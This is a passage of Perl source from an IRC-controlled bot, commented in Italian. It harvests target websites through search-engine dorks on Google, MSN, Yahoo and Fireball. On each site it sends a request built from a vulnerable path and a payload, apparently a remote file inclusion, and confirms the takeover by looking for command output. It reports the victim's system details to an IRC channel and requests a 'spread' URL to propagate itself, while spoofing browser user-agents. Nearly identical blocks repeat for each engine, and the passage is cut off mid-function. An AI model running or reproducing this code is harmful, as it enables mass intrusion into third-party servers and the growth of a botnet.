  display( $dsp, "PRIVMSG $channel 4,14?8?12? Google RO 99 ".scalar(@tot)." puliti ".scalar(@puliti)." con 4 $dork" );
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12? Google RO ha terminato di scannare .. sto exploitando/spreadando su  $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1Google RO");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1Google RO");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }



    if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
my @mlist = &msn3($dork);
  push( my @tot, @mlist );
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel 4,14?8?12? MSN II 99 ".scalar(@tot)." puliti ".scalar(@puliti)." con 4 $dork" );
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12? MSN II ha terminato di scannare .. sto exploitando/spreadando su  $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1MSN II");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1MSN II");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }


    if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
my @guklist = &guk($dork);
  push( my @tot, @guklist );
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel :4,14?8?12? GoogleUK 9 ".scalar(@tot)." puliti ".scalar(@puliti)." con 4$dork" );
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12? Google UK ha terminato di scannare .. sto exploitando/spreadando su  $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
              $ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :12,1Google UK ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1Google UK");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }

    if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
my @gdelist = &gde($dork);
  push( my @tot, @gdelist );
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel :4,14?8?12? Google DE 9 ".scalar(@tot)." puliti ".scalar(@puliti)." con 4$dork" );
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12?  Google DE ha terminato di scannare .. sto exploitando/spreadando su  $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
$ua->agent('Mozilla/4.8 [en] (Windows NT 5.0; U)');
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :12,1GOOGLE DE ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1GOOGLE DE");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }

    if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
my @ylist = &yahoo($dork);
  push( my @tot, @ylist );
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel :4,14?8?12? Yahoo 9 ".scalar(@tot)." puliti ".scalar(@puliti)." con 4$dork" );
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12?  Yahoo ha terminato di scannare .. sto exploitando/spreadando su  $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
$ua->agent('Mozilla/4.8 [en] (Windows NT 5.0; U)');
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :12,1Yahoo ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1Yahoo");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }


    if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
my @ylist = &fireball($dork);
  push( my @tot, @ylist );
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel :4,14?8?12? Fireball 9 ".scalar(@tot)." puliti ".scalar(@puliti)." con 4$dork" );
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12?  Fireball ha terminato di scannare .. sto exploitando/spreadando su  $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
$ua->agent('Mozilla/4.8 [en] (Windows NT 5.0; U)');
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :12,1Fireball ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1Fireball");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }


    if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
my @ylist = &git($dork);
  push( my @tot, @ylist );
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel :4,14?8?12? Google IT 9 ".scalar(@tot)." puliti ".scalar(@puliti)." con 4$dork" );
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12?  Google IT ha terminato di scannare .. sto exploitando/spreadando su  $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
$ua->agent('Mozilla/4.8 [en] (Windows NT 5.0; U)');
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :12,1Google IT");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1Google IT");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }


    if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
my @gatlist = &gat($dork);
  push( my @tot, @gatlist );
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel :4,14?8?12? Google AT 9 ".scalar(@tot)." puliti ".scalar(@puliti)." con 4$dork" );
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12? Google AT ha terminato di scannare .. sto exploitando/spreadando su  $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
$ua->agent('Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)');
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :12,1GOOGLE AT ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1GOOGLE AT");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
